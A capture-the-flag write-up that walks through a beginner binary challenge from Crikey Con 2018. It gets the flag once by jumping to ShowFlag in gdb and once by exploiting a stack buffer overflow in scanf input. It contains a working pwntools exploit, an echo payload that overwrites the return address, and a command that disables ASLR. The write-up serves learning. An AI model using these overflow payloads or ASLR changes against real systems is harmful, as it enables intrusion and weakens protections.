# Crikey Con 2018 CTF
## Points: 100
### Location: https://crikeyconctf.dook.biz/challenges#Binary
#### Last updated March 25 2018

This is a fun little binary exploitation exercise for noobs like me. 

I was introduced to this one at a recent sectalks meetup and at the time I had little to no idea what to do with it, other than some instruction pointer overwrites I had done in the past. 

I was told there were 2 ways to do this one: the easy _'lets get lots of CTF points quickly'_ way, and the not so easy _'this thing has an exploitable bug'_ way. 

So that's what we'll do here...

First up, we'll just get the flag really quickly using a debugger.

Then we'll move on to exploiting a vulnerability in the code such that we can get the flag without the aid of the debugger.

## Tools

To follow along here you'll want:
- a linux environment / VM
- [python 2.7](https://www.python.org/downloads/release/python-2714/)
- [pwntools](https://pypi.python.org/pypi/pwntools/3.5.1)
- a text editor
- [gdb](https://www.gnu.org/software/gdb/) & [gdb-peda](https://github.com/longld/peda)
- [radare2](http://www.radare.org/r/)

You can get at the target binary here:
https://crikeyconctf.dook.biz/challenges#Binary

> We probably shouldn't trust random bins from the internet, so best download this in to a throwaway VM.

## Assumptions
From here on out I'm going to assume some background knowledge:

- Use of a linux based OS
- Background in scripting or programming
- General understanding of what a buffer overflow is
- General understanding of how programs run, (instructions, registers, the stack & heap etc.)

# Normal operation

This binary commences by asking the user a question, and accepts some input, before returning a polite 'no'. It appears to always return no, so at first glance it appears that we need to type in the right string of characters to proceed.

```
Hi there, would you like the flag?
yes
Yeahhhhh, naaaaaaa.
```

It also appears to have a bug: when typing 120 characters, it returns a bus error, and anything over that results in a segmentation fault.

# Static analysis

```bash
$ rabin2 -I ./binary
$ checksec
```

[rabin2](https://radare.gitbooks.io/radare2book/content/rabin2/intro.html) and [checksec](https://www.systutorials.com/docs/linux/man/7-checksec/) tools shows the following key features about this binary:

- ELF 64bit little-endian, linux
- Position Independant Executable (PIE)
- No Execute Flag on (NX/DEP)
- Stack canaries are disabled
- Debugging symbols have not been stripped

Again, with rabin2 we can see a couple of references to the flag, the most interesting string being 'ShowFlag', warranting further decompilation.

For this I used r2's 'inspect Exports' feature:

```bash
$ r2 ./binary
[0x00000630]> iE
```

![Using radare 2 to inspect the exported symbols exposed by the binary](../../images/r2-inspect-exports.png)

At this point it is clear that ShowFlag is a function, disassembly showing that it outputs the flag a few characters at a time, using printf and putc.

Inspection of the AskQuestion function disassembly shows that the buffer used to receive input from the user via scanf allocates an array of 0x70 chars, and is congruent with the following snippet of C code:

```c
void AskQuestion(void) {
	char buf[0x70];
	printf("Here:\n");
	scanf("%s", &buf);
	printf("No\n");
}
```
This assumption that input will be less than 0x70 characters leaves the binary susceptible to a buffer overflow vulnerability.

## Approach #1: Debugger
```
GENERIC SPOILER ALERT IS GENERIC!!! 
```
The following approach was demonstrated at our local [sectalks](https://www.sectalks.org/) meetup, making use of gdb to jump to the location of the flag.

The advantage of this approach is that it is fast and can bypass any protections the binary might have, and since this is a downloadable binary, we have complete control over its execution context.

### Steps:
1. Load the binary in gdb
```
$ gdb ./binary
gdb> 
```
2. set a breakpoint in main
```
gdb> b main
```
3. run the program and jump to ShowFlag
```
gdb> r
Breakpoint 1, 0x0000555555554785 in main ()

gdb> j ShowFlag
The flag is:
flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

> Thanks to Daniel for showing us this method at sectalks ADL

## Approach #2: overflow exploitation

The buffer overflow theoretically allows a user on a misconfigured system to alter the program flow. My assumption here is that Address Space Layout Randomization (ASLR) is turned off, which negates the protection provided the binary's Position Independent Executable (PIE) flag being set.

By hooking the debugger we can see that the program flow is interrupted by the segmentation fault, leaving the instruction pointer at the return statement of the AskQuestion function:

### Turning off ASLR

I did attempt to exploit the buffer overflow without turning off ASLR, but was unable to find a way to do so. I couldn't find a way to ret2plt or ret2libc (not that I'm skilled at doing so) on account of this assembly being Position Independent, thereby randomizing the location of .bss, .plt & .got sections of the assembly. 

The closest I got was realising that I was able to perform a partial EIP overwrite to jump to a legitimate instruction, however it did not appear to go anywhere useful. I'm kind of hoping there is a way - and I'm just missing some learning...

To check that ASLR is off use
```
cat /proc/sys/kernel/randomize_va_space
```
A values > 0 indicate that ASLR is on in some way. Full explanation [here](https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html)

To change the state of ASLR use:
```
echo 0 | tee /proc/sys/kernel/randomize_va_space
```

While it is unlikely to be a 'real world' situation doing this, it is still instructive to do a simple 'ret'.

### The 'ret' instruction

The [ret instruction](http://www.felixcloutier.com/x86/RET.html) expects to take value at the top of the stack (pointed to by the stack pointer), and loads it into the instruction pointer, thus making that value, the next program instruction location. 

![Using radare2 debugger in visual mode to show the operation of the AskQuestion function](../../images/r2-ask-question.png)

Since (with ASLR off), we can know the runtime memory address of the ShowFlag function, all we need to do is place that memory address at the top of the stack, at the time the program crashes.

The following python script shows how this is achieved.

```python
1. #!/usr/bin/python2
2. import pwn
3. proc = pwn.process('./binary')
4. buf ='A' * (0x70+0x08) #0x70 chars + 8 more to allow for traversing the base pointer
5. buf += pwn.p64('0x555555554796')
6. proc.sendline(buf)
7. proc.interactive()
8. print buf

```

#### Breaking this down step by step
1. tells our system to run this using python2
2. imports a library to aid in binary return oriented programming, known as [pwntools](http://docs.pwntools.com/en/stable/)
3. connect a 'tube' to our binary so that we can interact with it
4. setup a buffer of 0x78 'A' characters to corrupt the stack
5. append the address of the ShowFlag function to the buffer, using a method called p64 to pack it in little endian order
6. send the buffer down the tube
7. leave the program in an interactive state
8. print out the contents of buffer so that we can use it for subsequent exploits

#### How to determine the correct length of the buffer

We can make an educated guess about the length of the buffer required to cause the desired effect, as the AskQuestion function is quite simple. It allocate 0x70 before running the function body, as we saw earlier, to create an array to store user input.

Due to the arrangement of the stack in relation to the base pointer, we need to also overwrite the base pointer with an additional 16 bytes (or 8 ascii chars)

However there is a fast way that pwntools gives us so we can skip the mental math: [cyclic](http://docs.pwntools.com/en/stable/util/cyclic.html?highlight=cyclic#pwnlib.util.cyclic.cyclic_find) and [cyclic_find](http://docs.pwntools.com/en/stable/util/cyclic.html?highlight=cyclic#pwnlib.util.cyclic.cyclic_find)

It is a bit fancy, but it creates a ['De Bruijn sequence'](https://en.wikipedia.org/wiki/De_Bruijn_sequence) such that we can use it to send down the wire instead of a bunch of boring A chars

This doesn't sound too useful until you see what the pair of functions can do:

```python
>>> import pwn
>>> pwn.cyclic(0x80)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab'
>>> pwn.cyclic_find('faab')
120
>>> hex(120)
0x78
```

As you can see - the first call made a sequence, and the second call was able to find the number of characters _into_ that sequence a particular string resides.

By sending this sequence to our binary on the first few attempts, we can look to see what pattern is present on the top of the stack when the sigsegv fires off.

Translating this offset as a hexadecimal confirms that our mental math is good, and we can plug that into our exploit code.

### Final destination

We can deliver the final exploit like this:
```bash
$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96GUUUU\x00\x00' | ./binary

Hi there, would you like the flag?
Yeahhhhh, naaaaaaa.
The flag is:
flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}

Bus error

```